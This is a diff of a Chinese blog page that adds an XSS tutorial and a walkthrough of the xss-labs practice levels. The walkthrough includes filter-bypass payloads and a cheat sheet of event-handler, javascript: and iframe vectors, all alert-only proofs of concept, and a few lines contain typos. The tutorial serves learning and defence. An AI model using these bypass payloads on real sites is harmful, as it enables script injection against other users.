@@ -193,7 +193,7 @@
   const ipt = document.querySelector('#search-input')
   const btn = document.querySelector('#search-btn')
   const layer = document.querySelector('#search-layer')
-  const posts = JSON.parse(`[{"title":"XSS","path":"2025/08/23/XSS/"},{"title":"SSRF漏洞","path":"2025/08/14/SSRF漏洞/"},{"title":"1zweb","path":"2025/07/09/1zweb/"},{"title":"XXE","path":"2025/08/16/XXE/"},{"title":"babyserialize","path":"2025/07/07/babyserialize/"},{"title":"level-up","path":"2025/07/07/level-up/"},{"title":"pop","path":"2025/07/07/pop/"}]`)
+  const posts = JSON.parse(`[{"title":"SSRF漏洞","path":"2025/08/14/SSRF漏洞/"},{"title":"XSS","path":"2025/08/23/XSS/"},{"title":"1zweb","path":"2025/07/09/1zweb/"},{"title":"XXE","path":"2025/08/16/XXE/"},{"title":"babyserialize","path":"2025/07/07/babyserialize/"},{"title":"level-up","path":"2025/07/07/level-up/"},{"title":"pop","path":"2025/07/07/pop/"}]`)
   ipt.addEventListener('keyup', e => {
     if (e.key === 'Enter') {
       handleSearch()
@@ -258,13 +258,13 @@
       <div class="main-left--statics">
         <a href="/categories">
           <div>
-            <span>4</span>
+            <span>5</span>
             <span>分类</span>
           </div>
         </a>
         <a href="/tags">
           <div>
-            <span>6</span>
+            <span>7</span>
             <span>标签</span>
           </div>
         </a>
@@ -358,13 +358,13 @@
           
           <div class="article-info--categories">
             <span>分类：</span>
-            
+            <a class="category-link" href="/categories/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/">跨站脚本攻击XSS</a>
           </div>
           
           
           <div class="article-info--tags">
             <span>标签：</span>
-            
+            <a class="tag-link" href="/tags/XSS/" rel="tag">XSS</a>
           </div>
           
           <p class="article-info--date">日期：2025-08-23 17:44:42</p>
@@ -373,7 +373,383 @@
       </div>
     </div>
     <article class="article-content markdown-body">
-      
+      <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="原理和分类"><a href="#原理和分类" class="headerlink" title="原理和分类"></a>原理和分类</h2><p><strong>跨站脚本攻击XSS</strong>就是恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！</p>
+<p>XSS分为：存储型 反射型 DOM型XSS</p>
+<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p><strong>存储型</strong>：持久化</p>
+<ol>
+<li>注入（Inject）</li>
+</ol>
+<p>攻击者将恶意 JavaScript 代码提交到目标网站（例如，写在博客评论区、论坛帖子、用户昵称等所有可输入且会显示给他人的地方）。</p>
+<ol start="2">
+<li>存储（Store）</li>
+</ol>
+<p>网站后端服务器在收到数据后，未经过滤或转义，便直接将含有恶意代码的内容保存到数据库中。</p>
+<ol start="3">
+<li>触发（Trigger）</li>
+</ol>
+<p>当其他普通用户浏览到包含那条恶意数据的页面时（例如，查看那条评论），服务器会从数据库取出数据，并将其作为网页的一部分返回给用户的浏览器。</p>
+<ol start="4">
+<li>执行（Execute）</li>
+</ol>
+<p>用户的浏览器接收到响应，将服务器返回的恶意代码当作页面合法部分解析并执行。</p>
+<p><img src="/2025/08/23/XSS/e5e033a7b4d425561638193ad9e949f9-17555018888901-17559427220511.png" alt="e5e033a7b4d425561638193ad9e949f9"></p>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p><strong>反射型</strong>：非持久性xss，一次性</p>
+<p>1.攻击构造：攻击者构造一个恶意链接：<br><a href="https://example.com/search?q=">https://example.com/search?q=</a><script>alert(&#39;XSS&#39;)</script></p>
+<p>2.用户点击：攻击者诱骗用户点击此链接。</p>
+<p>3.服务器响应：服务器接收到参数 q，未经过滤就直接将其拼接到HTML模板中：</p>
+<p>您搜索的关键词是：<script>alert('XSS')</script></p>
+
+<p>4.浏览器执行：用户的浏览器收到这个HTTP响应，解析HTML时遇到 <script> 标签，立即执行其中的恶意代码。</p>
+<p>关键：恶意脚本 <script>alert(&#39;XSS&#39;)</script> 是服务器返回的。</p>
+<p><img src="/2025/08/23/XSS/692106f54bd0c991fa85b8ef2891c206.png" alt="692106f54bd0c991fa85b8ef2891c206"></p>
+<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p><strong>DOM型</strong>:不经过后端，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。</p>
+<p><img src="/2025/08/23/XSS/v2-6605d590e20765f5c5cc91e14f890c6b_1440w.jpg" alt="img"></p>
+<p>为了更好的理解这我直接引用大佬的文章里面的例子了</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/397940947">(3 封私信) Web漏洞之XSS(跨站脚本攻击)详解 - 知乎</a></p>
+<p>如图，我们在URL中传入参数的值，然后客户端页面通过js脚本利用DOM的方法获得URL中参数的值，再通过DOM方法赋值给选择列表，该过程没有经过后端，完全是在前端完成的。所以，我们就可以在我们输入的参数上做手脚了</p>
+<p><img src="/2025/08/23/XSS/v2-27ef7f5f8aae5902dafb1fefb1d9826a_1440w.jpg" alt="img"></p>
+<p><strong>DOMxss攻击流程</strong></p>
+<p>攻击构造：攻击者构造一个恶意链接：<br><a href="https://example.com/search.html?keyword=">https://example.com/search.html?keyword=</a>&lt;img src&#x3D;x onerror&#x3D;alert(‘XSS’)&gt;</p>
+<p>用户点击：攻击者诱骗用户点击此链接。</p>
+<p>服务器响应：服务器返回一个静态的、干净的 search.html 文件，其中不包含任何攻击载荷。</p>
+<p>浏览器执行JS：用户的浏览器加载 search.html 并执行其中的 JavaScript 代码。</p>
+<p>JS操作DOM：JS 从 URL 中读取 keyword 参数的值 &lt;img src&#x3D;x onerror&#x3D;alert(‘XSS’)&gt;。</p>
+<p>恶意代码注入：JS 通过 innerHTML 将这个值不安全地写入到 DOM 中。</p>
+<p>浏览器渲染执行：浏览器渲染新DOM时，将 <img> 标签视为HTML。src&#x3D;”x” 会加载失败，从而触发 onerror 事件，执行其中的 JavaScript 代码 alert(‘XSS’)。</p>
+<p>关键：恶意脚本 &lt;img src&#x3D;x onerror&#x3D;alert(‘XSS’)&gt; 是客户端JS在本地写入DOM的，服务器毫不知情。</p>
+<p>可能触发DOM型XSS的属性</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">document.referer</span><br><span class="line">window.name</span><br><span class="line">location</span><br><span class="line">innerHTML</span><br><span class="line">documen.write</span><br></pre></td></tr></table></figure>
+
+<h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><h3 id="反射型xss和DOM型xss"><a href="#反射型xss和DOM型xss" class="headerlink" title="反射型xss和DOM型xss"></a>反射型xss和DOM型xss</h3><table>
+<thead>
+<tr>
+<th>特性</th>
+<th>反射型</th>
+<th>DOM型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>核心原理</td>
+<td>服务器将用户输入直接嵌入到响应页面中返回给浏览器。</td>
+<td>客户端的 JavaScript 执行时，不安全地操作了 DOM。</td>
+</tr>
+<tr>
+<td>数据处理位置</td>
+<td>服务器端。恶意代码由服务器返回。</td>
+<td>客户端（浏览器）。恶意代码在本地JS执行过程中产生。</td>
+</tr>
+<tr>
+<td>http响应</td>
+<td>响应中包含恶意代码。查看服务器返回的HTML源码可以看到恶意脚本。</td>
+<td>响应中不包含恶意代码。查看服务器返回的HTML源码是“干净”的。</td>
+</tr>
+<tr>
+<td>是否经过服务器</td>
+<td>是。攻击载荷会发送到服务器，并可能被服务器日志记录。</td>
+<td>通常否。攻击载荷完全在客户端处理，不会发送到服务器（因此WAF、日志可能无法发现）。</td>
+</tr>
+<tr>
+<td>触发方式</td>
+<td>需要诱导用户点击一个构造好的恶意链接。</td>
+<td>同样需要诱导用户点击一个构造好的恶意链接。</td>
+</tr>
+<tr>
+<td>检测方法</td>
+<td>1. 查看页面源码。<br/>2. 使用扫描器（如DAST）。<br/>3. 分析服务器端代码。</td>
+<td>1. 无法通过页面源码看到。<br/>2. 必须使用浏览器开发者工具分析DOM变化或JS执行。<br/>3. 代码审计（分析JS源码）是最有效的方法。</td>
+</tr>
+</tbody></table>
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ol>
+<li>反射型 &amp; DOM 型 XSS 防御</li>
+</ol>
+<p>  反射型：防御重点在服务器端。对从 URL、POST 数据等获取的参数，在输出到响应之前必须进行编码。</p>
+<p>​     DOM 型：防御重点在客户端 JavaScript。</p>
+<p>对从 location.hash, location.search, document.referrer 等来源获取的数据，在使用前进行验证和编码。</p>
+<p>避免基于用户输入来动态拼接和执行 JS（如 eval()）。</p>
+<ol start="2">
+<li>存储型 XSS 防御</li>
+</ol>
+<p>  防御重点在服务器端。</p>
+<p>存入数据库之前：进行严格的输入验证和过滤，甚至可以在此阶段进行一次“消毒”（Sanitization），移除或转义危险标签。</p>
+<p>从数据库取出输出到页面前：必须再次进行输出编码。这是一个深度防御策略。</p>
+<p>基础知识基本就是这些，下面我们要进行一个各种绕过的学习，为后面学习挖掘此类漏洞做铺垫</p>
+<h2 id="xss-labs"><a href="#xss-labs" class="headerlink" title="xss-labs"></a>xss-labs</h2><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>打开页面源码</p>
+<p><img src="/2025/08/23/XSS/fd7e146dd6aeaf7bdd8f5690a6c2b892.png" alt="img"></p>
+<p>直接上payload，get传参</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?name=&lt;script&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这样我们就成功的拿下这一关了，通过我们上面看到的改写的源代码直接跳转到第二关</p>
+<p><img src="/2025/08/23/XSS/72b5fe83e9d31e1ecd7905078cb26708.png" alt="img"></p>
+<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>我们和上一题一样直接把那个payload放进去，看看能不能行，显而易见肯定是不行滴</p>
+<p>那我们先看一下前端代码，再结合本题的后端代码联合解题</p>
+<p><img src="/2025/08/23/XSS/2c8c992b15cc95058aebdf0dfab26fff.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars(htmlspecialchars($str)).&quot;相关的结果.&lt;/h2&gt;&quot;.</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/08/23/XSS/4157991898f6b1bfc31983a730d0d11d.png" alt="img"></p>
+<p>那我们通过闭合value部分的双引号再奖赏闭合标签&gt;让浏览器认为<Input>标签已经渲染完毕，然后浏览器就会执行这个我们注入的没有被html实体转义的恶意代码，触发alert然后触发弹窗，绕过这题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;script&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>直接上题目源码，发现这里仍然有html实体转义，但是发现用双引号进行绕过时，双引号也被当成了字符串，显然是不行的</p>
+<p>这里插入一个小知识，html实体转义是不会转义单引号的，所以我们直接用单引号去绕过</p>
+<p>既然看过源码我们就知道不能像上面那样直接将双引号改成单引号直接上传，因为我们输入的字符串会直接被实体转义</p>
+<p>但是htmlspecialchars函数只针对&lt;&gt;大于小于号进行html实体化，所以我们另辟蹊径</p>
+<h4 id="onfocus事件绕过"><a href="#onfocus事件绕过" class="headerlink" title="onfocus事件绕过"></a>onfocus事件绕过</h4><p>onfocus事件在元素获得焦点时触发，是input标签的一个属性，<input>标签是有输入框的，简单来说，onfocus事件就是当输入框被点击的时候，就会触发myFunction()函数，然后我们再配合javascript伪协议来执行javascript代码&#x2F;</p>
+<p><img src="/2025/08/23/XSS/43e89180cfa5f43fdd3f8f8708d34203.png" alt="img"></p>
+<h4 id="javascript伪协议"><a href="#javascript伪协议" class="headerlink" title="javascript伪协议"></a>javascript伪协议</h4><p>通俗地讲，JavaScript伪协议不是真实存在的协议，它的功能是将JavaScript：后面的语句当做JavaScript代码在本页面执行，并不跳转到其他网页，而是结果返回给当前页面，相当于一个<strong>伪造的超链接</strong>，它经常与a标签一起使用，如：</p>
+<p><a href="javascript:alert('js!')">点击我</a></p>
+<p>paylaod</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onfocus=javascript:alert() &#x27;</span><br></pre></td></tr></table></figure>
+
+<p>上传然后再点击空白页面即可</p>
+<p>除了使用js为协议还有另外一种验证xss漏洞存在的做法（我们验证这个网页会执行我们传入的js代码即可）</p>
+<p>这里我们又要介入一个新知识就是内联事件属性</p>
+<h4 id="内联事件属性"><a href="#内联事件属性" class="headerlink" title="内联事件属性"></a>内联事件属性</h4><p>内联事件属性是直接写在HTML标签中的JavaScript事件处理代码。</p>
+<p>主要特点：</p>
+<p>HTML和JavaScript代码混合在一起</p>
+<p>当指定事件（如点击、鼠标移动等）发生时自动执行</p>
+<p>是XSS攻击最常见的利用点之一</p>
+<table>
+<thead>
+<tr>
+<th>事件处理器</th>
+<th>触发条件</th>
+<th>XSS 载荷示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>onclick</td>
+<td>元素被点击时</td>
+<td><div onclick="alert('XSS')">点击我</div></td>
+</tr>
+<tr>
+<td>onmouseover</td>
+<td>鼠标悬停在元素上时</td>
+<td><span onmouseover="alert('XSS')">悬停看我</span></td>
+</tr>
+<tr>
+<td>onmouseout</td>
+<td>鼠标从元素上移开时</td>
+<td><a onmouseout="alert('XSS')">链接</a></td>
+</tr>
+<tr>
+<td>ondblclick</td>
+<td>元素被双击时</td>
+<td><p ondblclick="alert('XSS')">双击我</p></td>
+</tr>
+<tr>
+<td>onfocus</td>
+<td>元素获得焦点（如被点击）时</td>
+<td><input onfocus="alert('XSS')"></td>
+</tr>
+<tr>
+<td>onchange</td>
+<td>表单元素值改变时（如下拉框）</td>
+<td><select onchange="alert('XSS')"></td>
+</tr>
+<tr>
+<td>onerror</td>
+<td>极其危险：资源加载失败时</td>
+<td><img src="x" onerror="alert('XSS')"></td>
+</tr>
+</tbody></table>
+<p>onfocus+元素autofocus只要页面加载就能自动聚焦，触发onfocus事件</p>
+  <input onfocus="alert('XSS')" autofocus>
+
+<p>我们这用关paylaod就可以这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=alert(1) &#x27;</span><br></pre></td></tr></table></figure>
+
+<h4 id="xss触发标签"><a href="#xss触发标签" class="headerlink" title="xss触发标签"></a>xss触发标签</h4><p><code>&lt;scrip&gt;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scirpt&gt;alert(&quot;777&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;img&gt;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">图片加载错误时触发</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=alert(1)&gt;</span><br><span class="line">&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&#x27;xss&#x27;)&quot;)&gt;</span><br><span class="line">鼠标指针移动到元素时触发</span><br><span class="line">&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;</span><br><span class="line">鼠标指针移出时触发</span><br><span class="line">&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;a&gt;</code>超链接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;https://www.qq.com&quot;&gt;qq&lt;/a&gt;</span><br><span class="line">&lt;a href=javascript:alert(&#x27;xss&#x27;)&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;javascript:a&quot; onmouseover=&quot;alert(/xss/)&quot;&gt;aa&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;&quot; onclick=alert(&#x27;xss&#x27;)&gt;a&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;&quot; onclick=eval(alert(&#x27;xss&#x27;))&gt;aa&lt;/a&gt;</span><br><span class="line">&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt(&#x27;xss&#x27;) y=2016&gt;aa&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;input&gt;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">竞争焦点，从而触发onblur事件</span><br><span class="line">&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;</span><br><span class="line">通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;</span><br><span class="line">&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;</span><br><span class="line">&lt;input value=&quot;&quot; onclick=alert(&#x27;xss&#x27;) type=&quot;text&quot;&gt;</span><br><span class="line">&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&#x27;xss&#x27;) bad=&quot;&quot;&gt;</span><br><span class="line">&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class="line">按下按键时触发</span><br><span class="line">&lt;input type=&quot;text&quot; onkeydown=&quot;alert(1)&quot;&gt;</span><br><span class="line">按下按键时触发</span><br><span class="line">&lt;input type=&quot;text&quot; onkeypress=&quot;alert(1)&quot;&gt;</span><br><span class="line">松开按键式时触发</span><br><span class="line">&lt;input type=&quot;text&quot; onkeyup=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;iframe&gt;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=javascript:alert(&#x27;xss&#x27;)&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(&#x27;xss&#x27;)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;aaa&quot; onmouseover=alert(&#x27;xss&#x27;) /&gt;&lt;iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;``xss``&amp;rpar;&quot;&gt;&lt;/iframe&gt;(````只有两个``)</span><br></pre></td></tr></table></figure>
+
+<p>我们在这仅展示较为常用的，原文链接在下</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/116462782">https://blog.csdn.net/LYJ20010728/article/details/116462782</a></p>
+<h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>我们这又是直接看源码解析一下</p>
+<p><img src="/2025/08/23/XSS/842b210d02b4e8c86850e527ba64d8b7.png" alt="img"></p>
+<p>到这基本把咱上面已经学过的绕过手法都已经过滤完了，因此我们现在要学习一种新的学习方法</p>
+<h4 id="a-href标签法"><a href="#a-href标签法" class="headerlink" title="a href标签法"></a>a href标签法</h4><p><img src="/2025/08/23/XSS/3d76230687597cd12652b56bb2abc570.png" alt="img"></p>
+<p>href属性的意思是 当标签<a>被点击的时候，就会触发执行转跳，上面是转跳到一个网站，我们还可以触发执行一段js代码</p>
+<p>构造payload就是将前面的input标签提起闭合掉，添加一个新的超链接标签插入我们的alert恶意代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href=javascript:alert()&gt;xxx&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>我们查看完题目源码之后发现已经过滤了很多东西</p>
+<p>但是发现一个漏洞，就是没有进行大小写替换那我们就是直接先用之前的paylaod判断一下用什么来闭合input标签</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;script&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现是可以成功绕过的</p>
+<p>那我们直接改下大小写即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;sCript&gt;alert()&lt;/sCript&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>大小写法</strong>绕过str_replace()函数 </p>
+<h3 id="-3"><a href="#-3" class="headerlink" title=""></a></h3><h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p>目前为止我们已经学习了很多关键字</p>
+<p>目前遇到的绕过手法也就这些，我们将这些关键字转换大小写之后传入看看怎么个事</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/08/23/XSS/a2e4ff6b4fef7787d5fa8a03d5db3799.png" alt="img"></p>
+<p>那我们就联想到文件上传漏洞学的那个<strong>双写绕过方式</strong></p>
+<p>直接将我们想要用的关键词里面重复一个，在服务端检查到这个关键词删掉之后还有一个完整的词</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a hrehreff=javasscriptcript:alert()&gt;xxx&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>这里打开题目就是引入眼帘的超链接</p>
+<p>我们像往常一样插入各种关键词顺便可以大小写转换和双写绕过，这里发现bug，他没有把关键词scirpt换成空格而是下划线，那这里就不能用双写绕过了</p>
+<p><img src="/2025/08/23/XSS/72d4cb98c6038dd314eb08dd08b293eb.png" alt="img"></p>
+<p>解题小tips:href的隐藏属性自动Unicode解码</p>
+<p>那就直接<strong>unicode编码</strong>一下然后传入即可</p>
+<p><a target="_blank" rel="noopener" href="https://www.matools.com/code-convert-unicode">在线Unicode编码解码 - 码工具</a></p>
+<h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</span><br></pre></td></tr></table></figure>
+
+<p>先插入哈，看看过滤了啥子</p>
+<p><img src="/2025/08/23/XSS/5e7953254c6c1439e145c7ad8294b12c.png" alt="img"></p>
+<p>好家伙直接不合法了，没招了看看源码</p>
+<p><img src="/2025/08/23/XSS/3d4614173b3c5d62a5c23edd60cbe8cb.png" alt="img"></p>
+<p>小知识：<strong>strpos</strong> 是 PHP 中一个非常常用的字符串处理函数，它的主要作用是查找字符串在另一字符串中第一次出现的位置。</p>
+<p>但是捏你想啊在一个恶意paylaod里面你放上一个http:&#x2F;&#x2F; 肯定是会影响到效果滴，所以要把这注释掉</p>
+<p>单行<strong>注释</strong>：&#x2F;&#x2F;</p>
+<p>多行注释：&#x2F;*  *&#x2F;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert()//http://</span><br></pre></td></tr></table></figure>
+
+<p>Unicode编码一下javascript</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116:alert()//http://</span><br></pre></td></tr></table></figure>
+
+<h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>来到第十关进度条一半咯</p>
+<p>来到第十关就能很明显的看到已经没有 任何的输入框和超链接了，但是想到第一关那咱还能get传参呀</p>
+<p>我们打开查看器看一下，看到三个input，那咱试一试看看这三个属性哪一个能被我们控制</p>
+<p><img src="/2025/08/23/XSS/5efb6cb57891f19dc685133e444b033c.png" alt="img"></p>
+<p>很明显只有t_sort能为我所用啊</p>
+<p>那就物尽其用，先把input这个标签给闭合了再传入我们的paylaod</p>
+<p><img src="/2025/08/23/XSS/abddb704a537ffe3af19814fbb40d5d9.png" alt="img"></p>
+<p>点击输入框直接跳转到下一关咯</p>
+<h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><p>这一关呢是利用<strong>请求头</strong>来造成的xss漏洞，在实战当中，这样的利用情况是很少见的，所以我们直接就看源码了</p>
+<p><img src="/2025/08/23/XSS/6c2c553b3040b3f576575e9797a702f1.png" alt="img"></p>
+<p>那咱就直接从源头出发，将原来的<strong>referer</strong>换成我们的paylaod</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; type=&#x27;text&#x27; onclick=&#x27;alert()&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>直接题目抓包修改referer成我们的payload</p>
+<p><img src="/2025/08/23/XSS/f07d12cb1b12ec11694ad5099548c371-17558594110592.png" alt="f07d12cb1b12ec11694ad5099548c371"></p>
+<p>然后就出现了我们的弹框</p>
+<p><img src="/2025/08/23/XSS/2146ed15781d73761a9a6f13c95b2a0e.png" alt="img"></p>
+<h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><p>直接上源码，和上一关是一样的</p>
+<p>不同的是这关是修改<strong>user-agent</strong>的值</p>
+<p>paylaod和上关一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; type=&#x27;text&#x27; onclick=&#x27;alert()&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/08/23/XSS/image-20250822184855659-17558597373943.png" alt="image-20250822184855659"></p>
+<p>直接下一关</p>
+<h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><p>这一关一如既往啊</p>
+<p>上面改的是请求头的referer和user-agent这俩</p>
+<p>这局是<strong>cookie值</strong></p>
+<h3 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h3><p>打开是一张图片，看检查器里面和以前的关卡好像是不一样捏</p>
+<p>这里出现一个陌生的东西</p>
+<h4 id="ng-include："><a href="#ng-include：" class="headerlink" title="ng-include："></a><strong>ng-include：</strong></h4><p>ng-include指令就是文件包涵的意思，用来包涵外部的html文件，如果包涵的内容是地址，需要加引号</p>
+<p>那我们包含最简单的一关level1来试试吧</p>
+<p><img src="/2025/08/23/XSS/fa876932b302e1ff22f729c318335041.png" alt="img"></p>
+<p>然后上传payload</p>
+<p>这一关不能使用script标签，因为由源码得知，浏览器会对我们传入的字符串进行html实体转化</p>
+<p>根据上面我们已经学习过的xss触发标签，除了script标签还有很多其他的</p>
+<p>这里我们随便使用一个即可</p>
+<p><img src="/2025/08/23/XSS/ab5337bddbd95091df1c70699202a610.png" alt="img"></p>
+<h3 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h3><p>先测试看看这关会考什么</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106; </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/08/23/XSS/593492a1b6e3b761572cf19a998d007f.png" alt="img"></p>
+<p>补充一点哈script也变成空格了</p>
+<p>这里那我们就要去使用其他标签进行一个绕过</p>
